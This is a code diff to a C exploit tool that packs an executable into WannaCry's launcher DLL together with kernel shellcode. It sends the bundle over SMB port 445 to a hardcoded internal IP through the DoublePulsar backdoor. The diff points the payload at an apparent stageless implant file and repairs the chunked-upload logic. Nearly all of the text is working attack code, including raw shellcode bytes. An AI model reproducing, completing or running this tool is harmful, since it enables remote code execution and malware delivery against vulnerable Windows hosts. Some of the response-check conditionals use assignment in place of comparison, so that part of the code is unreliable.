@@ -9,8 +9,8 @@
 #pragma comment(lib, "ws2_32.lib")
 
 /*
-This program reads in a sample EXE such as Putty.exe and merges it with the Wannacry launcher.dll found in the worm. 
-This DLL is a skeleton that allows us to attach an executable at the end.  
+This program reads in a sample EXE such as Putty.exe and merges it with the Wannacry launcher.dll found in the worm.
+This DLL is a skeleton that allows us to attach an executable at the end.
 When loaded, the DLL will extract the EXE resource, write it to disk and run it.
 
 This program then merges the Shellcode with the DLL and executable
@@ -22,7 +22,7 @@ It patches the values needed for this to work:
 Example: Total DLL size ( which includes your EXE ) = 0x50D800 bytes in size
 
 Update that value in the kernel shellcode which also includes the 3978 of userland shellcode
-This instructs the kernel shellcode to tell the OS how much memory to allocate 
+This instructs the kernel shellcode to tell the OS how much memory to allocate
 for the DLL & the Userland DLL bootstrap shellcode
 Kernel Shellcode[2158] = 0x50D800 + 3978;
 
@@ -164,8 +164,8 @@ unsigned char kernel_rundll_shellcode[] =
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x03\x00\x00"
-"\x20\x00\x00\x00\x70\x00\x00\x00\x08\x03\x00\x00\x4C\x00\x00\x00\xC8\x02\x00\x00\x01\x00\x00\x00\xBD\xA2\x37"
-"\x83\x00\x00\x00\x00\x00\x00\x00\x00\x8A\x23\x00\x00\x00\x00\x00\x00\x53\x55\x57\x56\x41\x54\x41\x55\x41\x56"
+"\x20\x00\x00\x00\x70\x00\x00\x00\x08\x03\x00\x00\x4C\x00\x00\x00\xC8\x02\x00\x00\x01\x00\x00\x00\x82\xE9\x43"
+"\x85\x00\x00\x00\x00\x00\x00\x00\x00\x8A\x23\x00\x00\x00\x00\x00\x00\x53\x55\x57\x56\x41\x54\x41\x55\x41\x56"
 "\x41\x57\x48\x89\xE0\x48\x89\xE1\x48\x83\xE1\x08\x48\x29\xCC\x48\x81\xEC\x00\x04\x00\x00\xE8\x00\x00\x00\x00"
 "\x5D\x48\x89\xE6\x48\x89\x06\x48\x81\xEC\x00\x04\x00\x00\x48\x8D\x3D\xD2\x0E\x00\x00\x49\x89\xF0\x48\x83\xC6"
 "\x08\x48\x31\xC9\x8A\x0F\x84\xC9\x74\x3F\x48\xFF\xC7\x8B\x0F\x48\x83\xC7\x04\x8B\x17\x48\x83\xC7\x04\x84\xD2"
@@ -407,7 +407,7 @@ int main(int argc, char* argv[])
 		return 0;
 	}
 	server.sin_family = AF_INET;
-	server.sin_addr.s_addr = inet_addr(argv[1]);
+	server.sin_addr.s_addr = inet_addr("192.168.0.70");
 	server.sin_port = htons((USHORT)445);
 	ret = connect(sock, (struct sockaddr*)&server, sizeof(server));
 
@@ -432,7 +432,7 @@ int main(int argc, char* argv[])
 	ptr = packet;
 	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX) - 1);
 	ptr += sizeof(SMB_TreeConnectAndX) - 1;
-	sprintf((char*)tmp, "\\\\%s\\IPC$", argv[1]);
+	sprintf((char*)tmp, "\\\\192.168.0.70\\IPC$");
 	convert_name((char*)ptr, (char*)tmp);
 	smblen = strlen((char*)tmp) * 2;
 	ptr += smblen;
@@ -464,15 +464,15 @@ int main(int argc, char* argv[])
 	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-	unsigned char signature[6];
+	unsigned char signature[5];
 	unsigned int sig;
 	//copy SMB signature from recvbuff to local buffer
 	signature[0] = recvbuff[18];
 	signature[1] = recvbuff[19];
 	signature[2] = recvbuff[20];
 	signature[3] = recvbuff[21];
-	signature[4] = recvbuff[22];
-	signature[5] = '\0';
+	//signature[4] = recvbuff[22];
+	signature[4] = '\0';
 	//this is for determining architecture
 	//recvbuff[22];
 	//but unused at this time
@@ -486,7 +486,7 @@ int main(int argc, char* argv[])
 	printf("Calculated XOR KEY:  0x%x\n", XorKey);
 
 	//your file path here
-	char filename[MAX_PATH] = "D:\\strike\\putty.exe";
+	char filename[MAX_PATH] = "F:\\SPRING 2025\\stageless.bin";
 	printf("Loading file: %s\n", filename);
 	DWORD	dwFileSizeLow = NULL;
 	DWORD	dwFileSizeHigh = NULL;
@@ -517,24 +517,24 @@ int main(int argc, char* argv[])
 
 
 	//0x50D800 = 5298176
-	DWORD DLLSIZE = 0x50D000;
-	
+	DWORD DLLSIZE = 0x50D800;
+
 	//allocate memory for DLL creation
 	PBYTE DLL = new BYTE[DLLSIZE];
 	memset(DLL, 0x00, DLLSIZE);
-	
+
 	//copy launcher DLL to buffer
 	memcpy(DLL, launcher_dll, 0xc8a4);
-	hexDump(NULL, (char*)&DLL[0xc8a4], 4);
-	
+	//hexDump(NULL, (char*)&DLL[0xc8a4], 4);
+
 	//add the size of the EXE after the DLL
 	*(DWORD*)&DLL[0xc8a4] = dwFileSizeLow;
-	hexDump(NULL, (char*)&DLL[0xc8a4], 4);
-	
+	//hexDump(NULL, (char*)&DLL[0xc8a4], 4);
+
 	//copy the EXE to the buffer, after the DWORD size value
-	memcpy(DLL + 0xc8a4 + 4, pExeBuffer, dwFileSizeLow);
-	printf("MZ HEADER EXPECTED:  ");
-	hexDump(NULL, (char*)&DLL[0xc8a4 + 4], 4);
+	memcpy((PBYTE)DLL + 0xc8a4 + 4, pExeBuffer, dwFileSizeLow);
+	//printf("MZ HEADER EXPECTED:  ");
+	//hexDump(NULL, (char*)&DLL[0xc8a4+4], 4);
 
 	//write out file here for debug purposes
 	/*
@@ -557,7 +557,8 @@ int main(int argc, char* argv[])
 	printf("BEFORE:  ");
 	hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
 
-	DWORD value = 5298176 + 3978;
+	//0x50D800
+	DWORD value = 0x50D800 + 3978;
 	*(DWORD*)&kernel_rundll_shellcode[2158] = value; // 5298176 + 3978;
 	printf("AFTER:  ");
 	hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
@@ -575,8 +576,9 @@ int main(int argc, char* argv[])
 	printf("AFTER:  ");
 	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
 
-	int kernel_shellcode_size = sizeof(kernel_rundll_shellcode) / sizeof(kernel_rundll_shellcode[0]);
-	kernel_shellcode_size -= 1;
+	//int kernel_shellcode_size = sizeof(kernel_rundll_shellcode) / sizeof(kernel_rundll_shellcode[0]);
+	//kernel_shellcode_size -= 1;
+	int kernel_shellcode_size = 6144;
 	printf("Kernel shellcode size:  %d\n", kernel_shellcode_size);
 
 	int payload_totalsize = kernel_shellcode_size + DLLSIZE;
@@ -586,7 +588,7 @@ int main(int argc, char* argv[])
 	int numberofpackets = payload_totalsize / 4096;
 	int remainder = payload_totalsize % 4096;
 	printf("will send %d packets\n ", numberofpackets);
-	printf("%d as a remainder\n", iterations);
+	printf("%d as a remainder\n", remainder);
 
 	memcpy(pFULLBUFFER, kernel_rundll_shellcode, 6144);
 	memcpy(pFULLBUFFER + 6144, DLL, DLLSIZE);
@@ -626,92 +628,12 @@ int main(int argc, char* argv[])
 	int size_normal_packet = 4096 + 12 + 70;
 
 	unsigned char* last_packet = (unsigned char*)malloc(remainder + 12 + 70);
-	int size_last_packet = iterations + 12 + 70;
+	int size_last_packet = remainder + 12 + 70;
 
+	int counter;
 	for (ctx = 0; ctx < payload_totalsize;)
 	{
 		memset((unsigned char*)big_packet, 0x00, 4096 + 12 + 70);
-		if (bytesLeft < 4096)
-		{
-			printf("Bytes left(%d) is less than 4096!...This will be the last & smaller packet!\n", bytesLeft);
-			smblen = bytesLeft + 70 + 12 - 4;
-			printf("Last packet size = %d\n", smblen);
-			smb_htons_len = htons(smblen);
-
-			memset(Parametersbuffer, 0x00, 12);
-			memcpy((unsigned char*)Parametersbuffer, (unsigned char*)&TotalSizeOfPayload, 4);
-			memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&bytesLeft, 4);
-			memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
-
-			for (i = 0; i < 13; i++)
-			{
-				Parametersbuffer[i] ^= byte_xor_key[i % 4];
-			}
-
-			//hexDump(NULL, Parametersbuffer, 12);
-
-			//copy wannacry skeleton packet to big Trans2 packet
-			memcpy((unsigned char*)last_packet, (unsigned char*)wannacry_Trans2_Request, 70);
-
-			//update size
-			memcpy(last_packet + 2, &smb_htons_len, 2);
-			printf("Last packet SMB len -> ");
-			hexDump(NULL, (char*)last_packet, 4);
-
-			TotalDataCount = bytesLeft;
-			DataCount = bytesLeft;
-			byteCount = bytesLeft + 12;
-
-			*(WORD*)(last_packet + 0x27) = TotalDataCount;
-			*(WORD*)(last_packet + 0x3b) = DataCount;
-			*(WORD*)(last_packet + 0x43) = byteCount;
-
-			memcpy((unsigned char*)last_packet + 0x27, (unsigned char*)&TotalDataCount, 2);
-			memcpy((unsigned char*)last_packet + 0x3b, (unsigned char*)&DataCount, 2);
-			memcpy((unsigned char*)last_packet + 0x43, (unsigned char*)&byteCount, 2);
-
-			//Update treeID, UserID
-			memcpy((unsigned char*)last_packet + 28, (unsigned char*)&treeid, 2);
-			memcpy((unsigned char*)last_packet + 32, (unsigned char*)&userid, 2);
-
-			//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
-			memcpy((unsigned char*)last_packet + 70, (unsigned char*)Parametersbuffer, 12);
-
-			//copy encrypted payload
-			memcpy((unsigned char*)last_packet + 82, (unsigned char*)pFULLBUFFER + ctx, bytesLeft);
-
-			//send the payload
-			send(sock, (char*)last_packet, size_last_packet, 0);
-			recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
-
-			//DoublePulsar response: STATUS_NOT_IMPLEMENTED
-			if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
-			{
-				printf("All data sent and got good response from DoublePulsar!\n");
-			}
-		
-			if (recvbuff[34] = 0x52)
-			{
-				printf("Doublepulsar returned: Success!\n");
-			}
-			
-			else if (recvbuff[34] = 0x62)
-			{
-				printf("Doublepulsar returned: Invalid parameters!\n");
-			}
-			
-			else if (recvbuff[34] = 0x72)
-			{
-				printf("Doublepulsar returned: Allocation failure!\n");
-			}
-				
-			else {
-				printf("Doublepulsar didn't work!\n");
-			}
-
-			break;
-		}
-
 		memset(Parametersbuffer, 0x00, 12);
 		memcpy((unsigned char*)Parametersbuffer, (unsigned char*)&TotalSizeOfPayload, 4);
 		memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&ChunkSize, 4);
@@ -746,22 +668,22 @@ int main(int argc, char* argv[])
 		{
 			printf("All data sent and got good response from DoublePulsar!\n");
 		}
-	
+
 		if (recvbuff[34] = 0x52)
 		{
 			printf("Doublepulsar returned: Success!\n");
 		}
-			
+
 		else if (recvbuff[34] = 0x62)
 		{
 			printf("Doublepulsar returned: Invalid parameters!\n");
 		}
-			
+
 		else if (recvbuff[34] = 0x72)
 		{
 			printf("Doublepulsar returned: Allocation failure!\n");
 		}
-				
+
 		else {
 			printf("Doublepulsar didn't work!\n");
 		}
@@ -769,6 +691,85 @@ int main(int argc, char* argv[])
 		bytesLeft -= 4096;
 		ctx += 4096;
 		OffsetofChunkinPayload += 4096;
+	}
+
+	if (remainder > 0)
+	{
+		printf("Bytes left(%d) is less than 4096!...This will be the last & smaller packet!\n", bytesLeft);
+		smblen = remainder + 70 + 12 - 4;
+		printf("Last packet size = %d\n", smblen);
+		smb_htons_len = htons(smblen);
+
+		memset(Parametersbuffer, 0x00, 12);
+		memcpy((unsigned char*)Parametersbuffer, (unsigned char*)&TotalSizeOfPayload, 4);
+		memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&remainder, 4);
+		memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
+
+		for (i = 0; i < 13; i++)
+		{
+			Parametersbuffer[i] ^= byte_xor_key[i % 4];
+		}
+
+		//hexDump(NULL, Parametersbuffer, 12);
+
+		//copy wannacry skeleton packet to big Trans2 packet
+		memcpy((unsigned char*)last_packet, (unsigned char*)wannacry_Trans2_Request, 70);
+
+		//update size
+		memcpy(last_packet + 2, &smb_htons_len, 2);
+		printf("Last packet SMB len -> ");
+		hexDump(NULL, (char*)last_packet, 4);
+
+		TotalDataCount = bytesLeft;
+		DataCount = bytesLeft;
+		byteCount = bytesLeft + 12;
+
+		*(WORD*)(last_packet + 0x27) = TotalDataCount;
+		*(WORD*)(last_packet + 0x3b) = DataCount;
+		*(WORD*)(last_packet + 0x43) = byteCount;
+
+		memcpy((unsigned char*)last_packet + 0x27, (unsigned char*)&TotalDataCount, 2);
+		memcpy((unsigned char*)last_packet + 0x3b, (unsigned char*)&DataCount, 2);
+		memcpy((unsigned char*)last_packet + 0x43, (unsigned char*)&byteCount, 2);
+
+		//Update treeID, UserID
+		memcpy((unsigned char*)last_packet + 28, (unsigned char*)&treeid, 2);
+		memcpy((unsigned char*)last_packet + 32, (unsigned char*)&userid, 2);
+
+		//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
+		memcpy((unsigned char*)last_packet + 70, (unsigned char*)Parametersbuffer, 12);
+
+		//copy encrypted payload
+		memcpy((unsigned char*)last_packet + 82, (unsigned char*)pFULLBUFFER + ctx, remainder);
+
+		//send the payload
+		send(sock, (char*)last_packet, size_last_packet, 0);
+		recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
+
+		//DoublePulsar response: STATUS_NOT_IMPLEMENTED
+		if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
+		{
+			printf("All data sent and got good response from DoublePulsar!\n");
+		}
+
+		if (recvbuff[34] = 0x52)
+		{
+			printf("Doublepulsar returned: Success!\n");
+		}
+
+		else if (recvbuff[34] = 0x62)
+		{
+			printf("Doublepulsar returned: Invalid parameters!\n");
+		}
+
+		else if (recvbuff[34] = 0x72)
+		{
+			printf("Doublepulsar returned: Allocation failure!\n");
+		}
+
+		else {
+			printf("Doublepulsar didn't work!\n");
+		}
 	}
 
 	delete pExeBuffer;
